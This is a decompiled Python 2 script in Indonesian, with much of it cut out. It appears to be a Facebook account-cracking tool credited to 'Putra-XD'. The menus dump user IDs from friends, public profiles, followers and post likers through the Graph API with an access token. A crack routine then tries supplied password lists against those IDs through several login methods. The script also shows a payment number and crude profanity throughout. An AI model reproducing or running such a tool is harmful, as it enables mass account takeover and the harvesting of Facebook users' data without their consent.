...
# Time Succes decompile : 2022-02-07 01:18:14.006209
import os
try:
    import requests
except ImportError:
...
def yayanxd():
    ...
    try:
        ...
        print '%s\xe2\x95\x91%s ' % (O, N)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Selamat Datang %s%s%s Ngentod \x1b[0;96m]' % (O, N, H, nama, N)
        time.sleep(2)
        print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Script Ini Baru Di Update Pada 2022 \x1b[0;96m]' % (O, N)
        time.sleep(2)
...
def moch_yayan():
    ...
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Author : \x1b[0;93mPutra-XD' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Github : \x1b[0;93mGithub.com/Putra-XD' % (O, N)
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s Team   : \x1b[0;93mDEWE WANI TEAM' % (O, N)
    time.sleep(0.04)
    print '%s%s' % (O, N)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s \x1b[0;93mDump id \x1b[0;97mdari teman \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s \x1b[0;93mDump id \x1b[0;97mdari teman publik \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s \x1b[0;93mDump id \x1b[0;97mdari total followers \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[4]%s \x1b[0;93mDump id \x1b[0;97mdari like postingan \x1b[0;96m[\x1b[0;93m5000\x1b[0;96m]' % (O, N)
    time.sleep(0.04)
    print '\x1b[0;97m%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[5]%s Mulai \x1b[0;93mCrack Facebook' % (O, N)
    time.sleep(0.04)
    ...
    time.sleep(0.04)
    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[0]%s Keluar \x1b[0;96m[%sAhh Ngecrot%s\x1b[0;96m]' % (O, N, K, N)
    time.sleep(0.04)
    print '%s\xe2\x95\x91%s' % (O, N)
    time.sleep(0.04)
    ...
    if pepek == '':
        ...
        try:
            ...
            file = raw_input('\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] masukan nama file :%s ' % (M, N, H))
            if file == '':
                file = raw_input('%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s\xe2\x80\xa2%s] masukan nama file :%s %s' % (N, M, N, H, N))
            ...
            print '\n%s[%s!%s] Awokawok kaga dapet hasil' % (N, K, N)
...
def teman(kontol):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s' % (asw, kontol)).json()['data']:
            ...
            sys.stdout.write('\r\x1b[0m - ' + w + '%s%s                                        \r\n\n[\x1b[0;96m%s\x1b[0m] [\x1b[0;92m%s\x1b[0m] Tunggu, Sedang Dump Id' % (a['name'], N, datetime.now().strftime('%H:%M:%S'), len(id)))
            sys.stdout.flush()
            time.sleep(0.003)

        ys.close()
        jalan('\n\n%s[%s\xe2\x9c\x93%s] berhasil dump id dari teman' % (N, H, N))
        print '[%s\xe2\x80\xa2%s] salin output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, cin, N)
        print 50 * '-'
...
def publik(kontol):
    ...
    try:
        ...
        print '[%s\xe2\x80\xa2%s] salin output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, knt, N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
...
def followers(kontol):
    ...
    try:
        ...
        print '[%s\xe2\x80\xa2%s] salin output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, ah, N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
...
def postingan(kontol):
    ...
    try:
        ...
        print '[%s\xe2\x80\xa2%s] salin output file \xf0\x9f\x91\x89 ( %s%s%s )' % (O, N, H, ahh, N)
        print 50 * '-'
        raw_input('[%s TEKAN ENTER%s ] ' % (O, N))
        moch_yayan()
    except (KeyError, IOError):
...
def info_tools():
    ...
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] Author    : Moch Aang Ardiansyah-XD & Yayan-XD.' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s>%s] Github    : Https://github.com/Putra-XD' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    ...
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
    print '%s[%s>%s] Dana  : 085710054640' % (N, H, N)
    time.sleep(0.09)
    print '%s[%s#%s]' % (N, O, N), 52 * '\x1b[1;96m-\x1b[0m'
    time.sleep(0.09)
...
def yo_ndak_tau_ko_tanya_saia():
    ...
    print '\n%s[%s\xe2\x80\xa2%s] Note: Cari User Agent Di Google Chrome' % (N, O, N)
...
def check_yntkts():
    ...
    print '\n%s[%s\xe2\x80\xa2%s] User Agent Kamu Saat Ini : %s%s' % (N, O, N, H, user_agent)
    raw_input('\n%s[ %sKEMBALI%s ]' % (N, H, N))
    moch_yayan()
...
class __crack__():
    ...
    def plerr(self):
        try:
            self.apk = raw_input('\n%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[?]%s Masukan File Dump :\x1b[0;93m ' % (O, N))
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n%s%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[%s Gunakan \x1b[0;92mkoma \x1b[0;97muntuk pemisah kata sandi \x1b[0;96m]' % (N, O, N)
            print '%s\xe2\x95\x91%s ' % (O, N)
            while True:
                pwek = raw_input('%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[?]%s Masukan kata sandi : \x1b[0;93m' % (O, N))
                print '\x1b[0;96m\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[\xe2\x80\xa2] \x1b[0;97mCrack dengan sandi [%s%s%s]' % (H, pwek, N)
                if pwek == '':
                    ...
                    print '%s\xe2\x95\x91%s ' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s Metode \x1b[0;93mApi \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93mCepat\x1b[0;96m]' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s Metode \x1b[0;93mApi \x1b[0;97mv2' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s Metode \x1b[0;93mMbasic \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93mLambat\x1b[0;96m]' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[4]%s Metode \x1b[0;93mMbasic \x1b[0;97mv2' % (O, N)
                    print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[5]%s Metode \x1b[0;93mMobile \x1b[0;96m[\x1b[0;93mSangat Lambat\x1b[0;96m]' % (O, N)
                    print '%s\xe2\x95\x91%s ' % (O, N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print '\n\x1b[0;96m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90[ \x1b[0;93mSilahkan Pilih Metode Untuk Login \x1b[0;96m]'
            print '%s\xe2\x95\x91%s ' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[1]%s Metode \x1b[0;93mApi \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93mCepat\x1b[0;96m]' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[2]%s Metode \x1b[0;93mApi \x1b[0;97mv2' % (O, N)
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[3]%s Metode \x1b[0;93mMbasic \x1b[0;97mv1 \x1b[0;96m[\x1b[0;93mLambat\x1b[0;96m]' % (O, N)
            ...
            print '%s%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90[%s y/t Goblok ]' % (N, K, N)
            time.sleep(2)
            moch_yayan()
        return
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print '%s\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90[%s!%s] Pilih Yang Bener !!' % (N, O, N)
            self.__pler__()
